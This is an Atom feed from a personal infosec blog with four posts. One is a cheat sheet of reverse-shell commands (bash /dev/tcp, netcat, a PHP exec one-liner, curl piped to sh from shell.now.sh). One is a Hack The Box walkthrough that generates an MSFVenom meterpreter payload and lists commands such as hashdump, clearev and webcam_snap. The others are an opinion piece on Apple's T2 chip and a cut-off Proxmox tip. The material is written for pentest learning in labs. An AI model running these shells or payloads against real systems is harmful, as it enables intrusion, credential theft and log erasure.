<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-12-05T20:51:37+01:00</updated><id>http://localhost:4000/</id><title type="html">L1Cafe</title><subtitle>Software, infosec, system administration projects, opinions and tips.</subtitle><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><entry><title type="html">Post-Exploitation: spawning a shell</title><link href="http://localhost:4000/2018/12/05/post-exploitation-spawning-shell" rel="alternate" type="text/html" title="Post-Exploitation: spawning a shell" /><published>2018-12-05T00:00:00+01:00</published><updated>2018-12-05T00:00:00+01:00</updated><id>http://localhost:4000/2018/12/05/post-exploitation-spawning-shell</id><content type="html" xml:base="http://localhost:4000/2018/12/05/post-exploitation-spawning-shell">&lt;p&gt;Once you have gained shell access on a machine, you will often find the prompt
extremely limited, especially if you have used manual exploitation. In these
cases, the shell often cannot perform basic tasks that you would expect from a
fully interactive shell prompt like Bash, or zsh. You will also be unable to run
intensive interactive commands such as the Vim text editor, or ncurses-based
programs.&lt;/p&gt;

&lt;p&gt;In those situations, if the system is reasonably standard, you will be able to
quickly get a complete shell prompt by invoking a shell of your liking. I
generally try to spawn Bash, because it’s shipped by default in most Linux and
some Unix systems (like macOS). Bash is reasonably powerful, complete, and well
documented. Bash also has additional features, like job control and
tab-completion that will only make your life that much easier as a pentester.&lt;/p&gt;

&lt;p&gt;These are my favourite snippets, decreasing to the least favourites (or
difficult to remember).&lt;/p&gt;

&lt;h1 id=&quot;python&quot;&gt;Python&lt;/h1&gt;

&lt;p&gt;Lots of Linux distributions will ship with Python by default. It’s also very
easy to read, but being a relatively modern programming language, very outdated
servers might not have it installed.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If Python is available, but Bash isn’t installed, you can also try to spawn
the Bourne Shell (sh), which is included in even more Unices, but it’s a bit
less feature-packed:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;perl&quot;&gt;Perl&lt;/h1&gt;

&lt;p&gt;If Python is not available, Perl might be. It is much older than Python, and
although it’s not very popular anymore, it used to be widely known in Linux
sysadmin circles, and soon would become the programming language of choice for
system administrators.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ perl —e 'exec &quot;/bin/sh&quot;;'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(As with Python, you can also try Bash).&lt;/p&gt;

&lt;h1 id=&quot;spawning-a-shell-directly&quot;&gt;Spawning a shell directly&lt;/h1&gt;

&lt;p&gt;The system you’re in might not have Python or Perl, but that doesn’t mean you
won’t get a shell. You can try simply calling the shell directly from your
session:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ /bin/sh -i
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;reverse-shells&quot;&gt;Reverse shells&lt;/h1&gt;

&lt;p&gt;You can also try to have the victim machine connect back to your computer for a
fully functional Bash shell.&lt;/p&gt;

&lt;p&gt;All the following examples require you to have Netcat installed on the
attacker’s computer. Then, you can run the following:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -l -p 8080 -vvv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This opens port 8080. Keep in mind the victim machine needs to be able to reach
your computer directly. So if you’re in the same LAN, this trick will work, but
it will definitely not work behind a NAT without some port-forwarding. &lt;code class=&quot;highlighter-rouge&quot;&gt;-vvv&lt;/code&gt; is
for added verbosity.&lt;/p&gt;

&lt;p&gt;Once the Netcat socket is listening on the attacking machine, we can try the
following snippets on the victim:&lt;/p&gt;

&lt;h2 id=&quot;bash-magic&quot;&gt;Bash magic&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ exec 5&amp;lt;&amp;gt;/dev/tcp/&amp;lt;YOUR_REACHABLE_IP_HERE&amp;gt;/8080
$ cat &amp;lt;&amp;amp;5 | while read line; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This very helpful &lt;a href=&quot;https://www.gnucitizen.org/blog/reverse-shell-with-bash/&quot;&gt;trick&lt;/a&gt;
will come in handy especially when the victim’s computer does not have Netcat
installed but Bash is present.&lt;/p&gt;

&lt;h2 id=&quot;netcat&quot;&gt;Netcat&lt;/h2&gt;

&lt;p&gt;Netcat is almost never present on production systems. But it’s yet another
option, and it’s easy to remember too.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -e /bin/sh &amp;lt;YOUR_REACHABLE_IP_HERE&amp;gt; 8888
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;php-with-bash&quot;&gt;PHP with Bash&lt;/h2&gt;

&lt;p&gt;If the victim is running PHP, chances are high the system has PHP installed as
well. In that case, you can try to make the PHP server run the following line.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php exec(&quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;YOUR_REACHABLE_IP_HERE&amp;gt;/8080 0&amp;gt;&amp;amp;1'&quot;); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;curl-with-shellnowsh&quot;&gt;Curl with shell.now.sh&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/lukechilds/reverse-shell&quot;&gt;shell.now.sh&lt;/a&gt; is a free service
that can help you pivot connections. Being a third party, it might stop working
eventually, but because it is an HTTPS connection, it has better chances of
evading corporate firewalls or even IDSs.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl https://shell.now.sh/&amp;lt;YOUR_REACHABLE_IP_HERE&amp;gt;:8080 | sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you run an invalid command, the shell will exit. To avoid this, you can force
it to keep reconnecting, but this will leave the machine exposed after you
finish pentesting it unless you kill the process or reboot the machine.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ while true; do curl https://shell.now.sh/&amp;lt;YOUR_REACHABLE_IP_HERE&amp;gt;:8080 | sh; done
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;php-with-shellnowsh&quot;&gt;PHP with shell.now.sh&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;? php exec(&quot;curl https://shell.now.sh/&amp;lt;YOUR_REACHABLE_IP_HERE&amp;gt;:8080 | sh&quot;); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;sources&quot;&gt;Sources&lt;/h1&gt;

&lt;p&gt;In no particular order:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.gnucitizen.org/blog/reverse-shell-with-bash/&quot;&gt;https://www.gnucitizen.org/blog/reverse-shell-with-bash/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97&quot;&gt;https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://netsec.ws/?p=337&quot;&gt;https://netsec.ws/?p=337&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/lukechilds/reverse-shell&quot;&gt;https://github.com/lukechilds/reverse-shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/rshipp/eee36684db07d234c1cc&quot;&gt;https://gist.github.com/rshipp/eee36684db07d234c1cc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/roy4801/ad7146e3a0da80a922ca1dde0afd17b0&quot;&gt;https://gist.github.com/roy4801/ad7146e3a0da80a922ca1dde0afd17b0&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="Cybersecurity" /><category term="HackTheBox" /><category term="hacking" /><category term="tip" /><summary type="html">Once you have gained shell access on a machine, you will often find the prompt extremely limited, especially if you have used manual exploitation. In these cases, the shell often cannot perform basic tasks that you would expect from a fully interactive shell prompt like Bash, or zsh. You will also be unable to run intensive interactive commands such as the Vim text editor, or ncurses-based programs.</summary></entry><entry><title type="html">What Apple’s T2 chip means for the security of Macs</title><link href="http://localhost:4000/2018/10/12/apple-t2-security" rel="alternate" type="text/html" title="What Apple's T2 chip means for the security of Macs" /><published>2018-10-12T00:00:00+02:00</published><updated>2018-10-12T00:00:00+02:00</updated><id>http://localhost:4000/2018/10/12/apple-t2-security</id><content type="html" xml:base="http://localhost:4000/2018/10/12/apple-t2-security">&lt;p&gt;An &lt;a href=&quot;https://www.macrumors.com/2018/10/04/t2-macs-must-pass-diagnostics-for-certain-repairs/&quot;&gt;article&lt;/a&gt; by Mac Rumors was recently published, revealing Apple had designed a component, which, according to an Apple document, would “result in an inoperative system” in the event a hardware replacement or repair was performed without running a proprietary diagnostics solution after.&lt;/p&gt;

&lt;p&gt;Naturally, e-waste activists and supporters of the “right to repair” movement (like me) are annoyed by this new chip that would, apparently, make it impossible to perform third-party repairs, which are much cheaper, or outright turning the computer into a very expensive paperweight when Apple decides to stop repairing those devices because they are considered too old to be accounted for.&lt;/p&gt;

&lt;!-- Courtesy of embedresponsively.com //--&gt;
&lt;div class=&quot;responsive-video-container&quot;&gt;

  &lt;iframe src=&quot;https://www.youtube.com/embed/4KuVvb9DTaU&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;/div&gt;

&lt;p&gt;This, however, is nothing new. Apple has, at least since the inception of the iPhone, tried to keep people away from their software (closing loopholes used by jailbreakers) with increasing success as of lately, as well as hardware (using special screws and gluing parts). It is very clear why a company like Apple would want to do this: Their business model is selling hardware, and the more they sell, the better. Even better if they can make their devices last less so you have to buy new products more often. Louis Rossman, an electronics technician, has, repeatedly, shown how &lt;a href=&quot;https://youtu.be/4KuVvb9DTaU&quot;&gt;Apple designs their products so that only they can open and repair them&lt;/a&gt; (video above). This is a very widespread practice across the whole consumer electronics industry, and other companies have quickly adopted designs that leave removable batteries and expandable storage out, in favour of planned obsolescence. This goes back as far as 2007, at least, with the infamous &lt;a href=&quot;https://en.wikipedia.org/wiki/Sony_timer&quot;&gt;Sony Timer&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;What I’ve seen so far, are heated up arguments on how Apple and others are intentionally building devices with an artificially short lifespan. However, I believe we’re not considering some key details, and I want to provide an additional point of view, which is entirely my opinion, on why this is might be a good idea even for the consumer.&lt;/p&gt;

&lt;p&gt;Supply chain security is important as evidenced by the &lt;a href=&quot;https://www.bloomberg.com/news/features/2018-10-04/the-big-hack-how-china-used-a-tiny-chip-to-infiltrate-america-s-top-companies&quot;&gt;recent news&lt;/a&gt; by Bloomberg. Although security experts and the companies accused of having been infiltrated are not completely sure of the sources Bloomberg used and the veracity of the document, some experts argue that this is definitely possible, and we must be very careful with the security of hardware. One thing is clear: the best way to be reasonably safe from security issues is to control the full supply chain, and Apple has a higher degree of control over the supply chain for MacBooks than, say, Lenovo or HP for their laptops.&lt;/p&gt;

&lt;p&gt;Computer Security in general, has become a critical asset that any company nowadays must take seriously. And it’s not just evil hackers selling credit cards in the dark web from a basement, we also must be aware of State-sponsored attacks, terrorist organisations, and organised crime gangs.&lt;/p&gt;

&lt;!-- Courtesy of embedresponsively.com //--&gt;
&lt;div class=&quot;responsive-video-container&quot;&gt;

  &lt;iframe src=&quot;https://www.youtube.com/embed/loBX_vEXxVA&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;/div&gt;

&lt;p&gt;Remember the video of the &lt;a href=&quot;https://www.youtube.com/watch?v=loBX_vEXxVA&quot;&gt;hardware backdoor installation&lt;/a&gt;? (video above). It’s very clear that once a computer is physically in the hands of a skilled criminal, the possibilities are endless. From attaching a hardware keylogger, a GPS tag, replacing the Ethernet controller firmware with a malicious one, cloning the hard disk… It’s exactly as easy for an attacker as it is for a third-party repair shop that is not associated with the laptop’s brand.&lt;/p&gt;

&lt;p&gt;This could be impossible to do in a MacBook Pro 2018 with the T2 chip: If Apple is performing the appropriate verifications at boot time to ensure the hardware hasn’t been tampered with, there is simply no way to break into a MacBook Pro, especially because almost all its parts are either glued-in or soldered into the mainboard. Of course, there’s also the issue of &lt;a href=&quot;https://trmm.net/Thunderstrike_FAQ&quot;&gt;Thunderstrike&lt;/a&gt; in regards to malicious Thunderbolt devices. The good news is, as a proof of Apple being committed to security, &lt;a href=&quot;https://appleinsider.com/articles/16/02/02/apple-hires-firmware-security-experts-who-worked-on-thunderstrike-2-exploit&quot;&gt;they hired the team behind Thunderstrike 2&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Apple is, out of the big four technology companies (Microsoft, Google, Facebook, Apple), probably the one that treats their clients’ security and privacy with the most respect. Microsoft injects ads in Windows 10, and bundles all sorts of tracking into the OS. Google runs literally the largest advertising agency (DoubleClick), and gives lots of free services in exchange for user information and placing ads and tracking features everywhere. I don’t think it’s even necessary to mention what Facebook does at this point. Apple, however, has a radically different business model: Their products are aimed at the higher end of the purchasing power spectrum, are beautifully designed, and, while Apple used to run an advertising service, they made so very little money off ads they shut down their iAd App Network service.&lt;/p&gt;

&lt;p&gt;In general, I would argue that Apple products are expensive because they refuse to sell user data and/or bundle bloatware into their devices. The sad truth is that even high-end, expensive smartphones like the Galaxy S series still carry bloatware.&lt;/p&gt;

&lt;p&gt;Wrapping it all up: it’s probably safe to assume Apple is bundling the T2 chip to artificially limit the lifespan of their devices, so people buy more devices more often: after all, that’s how they really make money. But the truth is we don’t really know if that’s the case, and while it’s true shortening the lifespan of a device is a very good reason to bundle such chip, it also brings security features that no other brand can offer.&lt;/p&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="opinion" /><category term="Apple" /><summary type="html">An article by Mac Rumors was recently published, revealing Apple had designed a component, which, according to an Apple document, would “result in an inoperative system” in the event a hardware replacement or repair was performed without running a proprietary diagnostics solution after.</summary></entry><entry><title type="html">MSFVenom and Meterpreter: The basics</title><link href="http://localhost:4000/2018/09/11/msfvenom" rel="alternate" type="text/html" title="MSFVenom and Meterpreter: The basics" /><published>2018-09-11T13:20:20+02:00</published><updated>2018-09-11T13:20:20+02:00</updated><id>http://localhost:4000/2018/09/11/msfvenom</id><content type="html" xml:base="http://localhost:4000/2018/09/11/msfvenom">&lt;p&gt;I just recently successfully gained root (or rather, Administrator, because it’s a Windows box) on the &lt;strong&gt;Devel&lt;/strong&gt; machine in &lt;a href=&quot;https://hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The machine itself is very easy, and there are lots of writeups on it, I’m sure, so this won’t be another one. However, one thing it made really clear and simple was learning &lt;strong&gt;MSFVenom&lt;/strong&gt; and getting to use reverse shells in a realistic scenario. Therefore, I’ll use the machine as an example to illustrate the usage of MSFVenom.&lt;/p&gt;

&lt;p&gt;In this case, the machine is running IIS, with an FTP server that allows anonymous uploads, and an HTTP server running on the traditional port 80.&lt;/p&gt;

&lt;p&gt;This is where MSFVenom comes in handy: We can upload arbitrary files and trigger their execution.&lt;/p&gt;

&lt;p&gt;Some information:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The victim’s IP is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.5&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Our IP is &lt;code class=&quot;highlighter-rouge&quot;&gt;x.y.z.w&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;We have no firewalls blocking inbound connections (this is a requirement if you want to have reverse shells connect back to you)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;the-reverse-shell&quot;&gt;The reverse shell&lt;/h2&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.y.z.w LPORT=1337 -f aspx &amp;gt; devel.aspx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Sets the payload to be a reverse TCP meterpreter shell (for Metasploit), for Windows machines. You can query the full list of payloads by running &lt;code class=&quot;highlighter-rouge&quot;&gt;$ msfvenom -l payloads&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Sets our IP to be &lt;code class=&quot;highlighter-rouge&quot;&gt;x.y.z.w&lt;/code&gt; (the victim machine must be able to reach us on that IP)&lt;/li&gt;
  &lt;li&gt;Sets our listening port to be &lt;code class=&quot;highlighter-rouge&quot;&gt;1337&lt;/code&gt; (remember this, you’ll need it to configure the listening end of the reverse shell: Metasploit)&lt;/li&gt;
  &lt;li&gt;Sets the format to be ASPX, C#&lt;/li&gt;
  &lt;li&gt;Creates a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;devel.aspx&lt;/code&gt; in the current directory&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;configure-metasploit&quot;&gt;Configure Metasploit&lt;/h2&gt;

&lt;p&gt;Now we have to configure Metasploit to listen to remote connections, using the same parametres given to MSFVenom.&lt;/p&gt;

&lt;p&gt;(The following commands are to be executed sequentially in a Metasploit Console)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost x.y.z.w
set lport 1337
set ExitOnSession false
exploit -j
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Metasploit is now ready to accept connections to port &lt;code class=&quot;highlighter-rouge&quot;&gt;1337&lt;/code&gt; and the specified IP address (in this case &lt;code class=&quot;highlighter-rouge&quot;&gt;x.y.z.w&lt;/code&gt;)&lt;/p&gt;

&lt;h2 id=&quot;triggering-the-reverse-shell&quot;&gt;Triggering the reverse shell&lt;/h2&gt;

&lt;p&gt;In this case, now that we have the &lt;code class=&quot;highlighter-rouge&quot;&gt;devel.aspx&lt;/code&gt; file, we have to upload it via FTP. Because the FTP is pointing to the same directory as the HTTP server, we can just drop it there, and then navigate to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.5/devel.aspx&lt;/code&gt;. A blank page will appear, but if we did everything correctly, a new line will appear in the listening console. It will say something similar to: &lt;code class=&quot;highlighter-rouge&quot;&gt;Meterpreter session 1 opened (x.y.z.w:1337 -&amp;gt; 10.10.10.5:49160)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;At this point, we can list sessions by issuing &lt;code class=&quot;highlighter-rouge&quot;&gt;sessions -l&lt;/code&gt; at the Metasploit console, and attach to the newly opened session by running &lt;code class=&quot;highlighter-rouge&quot;&gt;sessions &amp;lt;SESSION ID&amp;gt;&lt;/code&gt;, in this case, the session ID is 1, so &lt;code class=&quot;highlighter-rouge&quot;&gt;sessions 1&lt;/code&gt; attaches correctly to the shell.&lt;/p&gt;

&lt;h2 id=&quot;meterpreter&quot;&gt;Meterpreter&lt;/h2&gt;

&lt;p&gt;Now we’re in a Meterpreter Windows session, we can issue the following commands (note that to specify the folder separator in Meterpreter, you must use double slashes &lt;code class=&quot;highlighter-rouge&quot;&gt;//&lt;/code&gt; and not the standard Windows backslash &lt;code class=&quot;highlighter-rouge&quot;&gt;\&lt;/code&gt;):&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;dir&lt;/code&gt;: lists the files and directories&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cd&lt;/code&gt;: changes directory, behaves just like Linux systems&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pwd&lt;/code&gt;: shows the full path for the current directory, similar to Linux as well&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;background&lt;/code&gt;: sends the Meterpreter session to the background, and resumes your Metasploit session, you can always return by reattaching the session with &lt;code class=&quot;highlighter-rouge&quot;&gt;sessions &amp;lt;SESSION ID&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt;: prints text files to the screen, like the Linux command of the same name&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;download&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;upload&lt;/code&gt;: respectively download or upload files from/to the machine&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;getuid&lt;/code&gt;: returns the user the reverse shell is running with, useful to let us know if we gained Administrator access&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;clearev&lt;/code&gt;: clears the &lt;em&gt;Application&lt;/em&gt;, &lt;em&gt;System&lt;/em&gt; and &lt;em&gt;Security&lt;/em&gt; logs for the machine&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;execute&lt;/code&gt;: runs an arbitrary command given as the argument&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hashdump&lt;/code&gt;: dumps the contents of the &lt;em&gt;SAM&lt;/em&gt; database&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;idletime&lt;/code&gt;: displays how much time has passed since the user was active&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ipconfig&lt;/code&gt;: retrieves the network interface configuration&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ps&lt;/code&gt;: like the Linux tool of the same name, displays a list of running processes in the victim machine&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt;: invokes a standard shell&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;webcam_list&lt;/code&gt;: displays currently connected and configured web cams on the victim machine&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;webcam_snap&lt;/code&gt;: takes a picture from a connected camera, and saves it to the current working directory with a random filename&lt;/li&gt;
&lt;/ul&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="Cybersecurity" /><category term="HackTheBox" /><summary type="html">I just recently successfully gained root (or rather, Administrator, because it’s a Windows box) on the Devel machine in Hack The Box.</summary></entry><entry><title type="html">Proxmox tip: “Failed to start VNC server: Failed to bind socket: Cannot assign requested address”</title><link href="http://localhost:4000/2018/08/30/proxmox-vnc" rel="alternate" type="text/html" title="Proxmox tip: &quot;Failed to start VNC server: Failed to bind socket: Cannot assign requested address&quot;" /><published>2018-08-30T15:44:32+02:00</published><updated>2018-08-30T15:44:32+02:00</updated><id>http://localhost:4000/2018/08/30/proxmox-vnc</id><content type="html" xml:base="http://localhost:4000/2018/08/30/proxmox-vnc">&lt;p&gt;Note: This issue appears on Proxmox 5.2-x, always check the date of the post when troubleshooting your systems.&lt;/p&gt;

&lt;p&gt;I stumbled across this particularly interesting error when I was moving KVM backups from a Proxmox host to another host. For some reason, I wasn’t able to find any information on the Internet regarding this issue.&lt;/p&gt;

&lt;p&gt;Let’s get to it!&lt;/p&gt;

&lt;h2 id=&quot;steps-to-reproduce-it&quot;&gt;Steps to reproduce it:&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;Back up a KVM machine from a Proxmox host. If you back up to the default local storage, there will be a tarball file in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/lib/vz/dump/&lt;/code&gt; (GZIP or LZO, depending on what you selected when backing up)&lt;/li&gt;
  &lt;li&gt;Copy that file to a different Proxmox host. You can use rsync, SFTP, FTP, it doesn’t really matter.&lt;/li&gt;
  &lt;li&gt;Place that file in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/lib/vz/dump&lt;/code&gt; in the second host (or wherever you want that’s set up in Proxmox to use as VZDump backup file directory).&lt;/li&gt;
  &lt;li&gt;Try to restore the tarball through the Proxmox Web GUI by choosing the file in the appropriate storage and clicking “Restore”.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The machine is now copied to the second server, but if you try to start it, an error will appear. It will look like this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kvm: -vnc 192.168.33.5:85: Failed to start VNC server: Failed to bind socket: Cannot assign requested address
TASK ERROR: start failed: command '/usr/bin/kvm -id 115 -name xyz -chardev 'socket,id=qmp,path=/var/run/qemu-server/115.qmp,server,nowait' -mon 'chardev=qmp,mode=control' -pidfile /var/run/qemu-server/115.pid -daemonize -smbios 'type=1,uuid=abcd' -smp '1,sockets=1,cores=1,maxcpus=1' -nodefaults -boot 'menu=on,strict=on,reboot-timeout=1000,splash=/usr/share/qemu-server/bootsplash.jpg' -vga std -vnc unix:/var/run/qemu-server/115.vnc,x509,password -no-hpet -cpu 'kvm64,+lahf_lm,+sep,+kvm_pv_unhalt,+kvm_pv_eoi,hv_spinlocks=0x1fff,hv_vapic,hv_time,hv_reset,hv_vpindex,hv_runtime,hv_relaxed,enforce' -m 5120 -vnc 192.168.33.5:85 -device 'pci-bridge,id=pci.1,chassis_nr=1,bus=pci.0,addr=0x1e' -device 'pci-bridge,id=pci.2,chassis_nr=2,bus=pci.0,addr=0x1f' -device 'piix3-usb-uhci,id=uhci,bus=pci.0,addr=0x1.0x2' -device 'usb-tablet,id=tablet,bus=uhci.0,port=1' -device 'virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x3' -drive 'file=/var/lib/vz/images/115/vm-115-disk-1.raw,if=none,id=drive-ide0,cache=writeback,format=raw,aio=threads,detect-zeroes=on' -device 'ide-hd,bus=ide.0,unit=0,drive=drive-ide0,id=ide0,bootindex=100' -drive 'if=none,id=drive-ide2,media=cdrom,aio=threads' -device 'ide-cd,bus=ide.1,unit=0,drive=drive-ide2,id=ide2,bootindex=200' -netdev 'type=tap,id=net0,ifname=tap115i0,script=/var/lib/qemu-server/pve-bridge,downscript=/var/lib/qemu-server/pve-bridgedown' -device 'e1000,mac=xx:xx:xx:xx:xx:xx,netdev=net0,bus=pci.0,addr=0x12,id=net0,bootindex=300' -rtc 'driftfix=slew,base=localtime' -global 'kvm-pit.lost_tick_policy=discard'' failed: exit code 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(Note: everything was copied from the Proxmox Web GUI, but the name, MAC and BIOS UUID have been altered)&lt;/p&gt;

&lt;p&gt;At first glance, it could look like a ports issue. But we’re not opening ports, are we? Why is this machine throwing a VNC error when I didn’t even try to open up VNC?&lt;/p&gt;

